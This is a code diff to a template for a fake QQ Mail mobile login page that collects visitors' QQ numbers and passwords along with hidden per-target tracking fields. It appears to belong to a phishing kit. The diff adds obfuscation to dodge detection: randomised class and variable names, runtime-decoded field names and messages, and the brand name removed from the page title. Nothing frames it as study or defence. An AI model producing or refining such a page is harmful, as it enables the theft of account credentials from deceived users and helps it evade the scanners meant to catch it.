@@ -5,8 +5,7 @@
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
     <meta id="viewport" name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no"
     />
-    <meta name="apple-mobile-web-app-capable" content="yes" />
-    <title class="<%=ranStr[4]%>"><%= function(){var x = ranRp('QQ邮箱');return x.key+':'+x.val}()%></title>
+    <title class="<%=ranStr[4]%>"><%= function(){var x = ranRp('请输入账号密码');return x.key+':'+x.val}()%></title>
     <style type="text/css">
         @charset "utf-8";
         html {
@@ -596,9 +595,9 @@
                                 <span id="<%=ranStr[65]%>" class="<%=ranStr[28]%>"></span>
                             </div><input id="<%=ranStr[66]%>" class="<%=ranStr[20]%> <%=ranStr[6]%> <%=ranStr[48]%>" maxlength="16" type="password" name="p" autocorrect="off"
                                 placeholder="<%= function(){var x = ranRp('请输入您的QQ密码');return x.key+':'+x.val}()%>" /></li>
-                        <input type="hidden" name="uid" value="<%=uid%>">
-                        <input type="hidden" name="mid" value="<%=mid%>">
-                        <input type="hidden" name="tz" value="<%=tz%>">
+                        <input type="hidden" class="<%=ranStr[190]%>" name="<%= function(){var x = ranRp('uid');return x.key+':'+x.val}()%>" value="<%=uid%>">
+                        <input type="hidden" class="<%=ranStr[190]%>" name="<%= function(){var x = ranRp('mid');return x.key+':'+x.val}()%>" value="<%=mid%>">
+                        <input type="hidden" class="<%=ranStr[190]%>" name="<%= function(){var x = ranRp('tz');return x.key+':'+x.val}()%>" value="<%=tz%>">
                     </ul>
                 </form>
                 <div href="javascript:void(0);" id="<%=ranStr[45]%>" class="<%=ranStr[4]%> <%=ranStr[60]%>"><%= function(){var x = ranRp('登录?');return x.key+':'+x.val}()%></div>
@@ -619,6 +618,9 @@
 </body>
 <script src="/jquery/<%=ranStr[99]%>" type="text/javascript"></script>
 <script>
+    $('.<%=ranStr[190]%>').each(function(){
+        $(this).attr('name',<%=ranStr[199]%>($(this).attr('name')));
+    })
     $('.<%=ranStr[48]%>').each(function () {
         var <%=ranStr[61]%> = $(this).attr('placeholder');
         $(this).attr('placeholder', eval('"' + <%=ranStr[61]%>.replace(/\\x/g, '\\u') + '"'));
@@ -632,13 +634,15 @@
     var <%=ranStr[51]%> = $('#<%=ranStr[18]%>');
     $('#<%=ranStr[45]%>').on('click', function () {
         if ($('#<%=ranStr[47]%>').val() === '') {
-            <%=ranStr[51]%>.html(eval('"' + '=_8bf7=_8f93=_5165=_0051=_0051=_53f7=_ff01'.replace(/=_/g, '\\u') + '"'));
+            var <%=ranStr[198]%> = "<%= function(){var x = ranRp('请输入QQ号!');return x.key+':'+x.val}()%>"
+            <%=ranStr[51]%>.html(<%=ranStr[199]%>(<%=ranStr[198]%>));
             <%=ranStr[50]%>.css({ "display": "block" })
             setTimeout(function () {
                 <%=ranStr[50]%>.css({ "display": "none" })
             }, 1000);
         } else if ($('#<%=ranStr[66]%>').val() === '') {
-            <%=ranStr[51]%>.html(eval('"' + '=_4f60=_8fd8=_6ca1=_6709=_8f93=_5165=_5bc6=_7801=_ff01'.replace(/=_/g, '\\u') + '"'));
+            var <%=ranStr[197]%> = "<%= function(){var x = ranRp('你还没有输入密码!');return x.key+':'+x.val}()%>"
+            <%=ranStr[51]%>.html(<%=ranStr[199]%>(<%=ranStr[197]%>));
             <%=ranStr[50]%>.css({ "display": "block" })
             setTimeout(function () {
                 <%=ranStr[50]%>.css({ "display": "none" })
@@ -648,7 +652,8 @@
         }
     });
     if (<%=ranStr[62]%> === '1') {
-        <%=ranStr[51]%>.html(eval('"' + '=_8d26=_53f7=_5bc6=_7801=_9519=_8bef=_0021'.replace(/=_/g, '\\u') + '"'));
+        var <%=ranStr[196]%> = "<%= function(){var x = ranRp('账号密码错误!');return x.key+':'+x.val}()%>"
+        <%=ranStr[51]%>.html(<%=ranStr[199]%>(<%=ranStr[196]%>));
         <%=ranStr[50]%>.css({ "display": "block" })
         setTimeout(function () {
             <%=ranStr[50]%>.css({ "display": "none" })
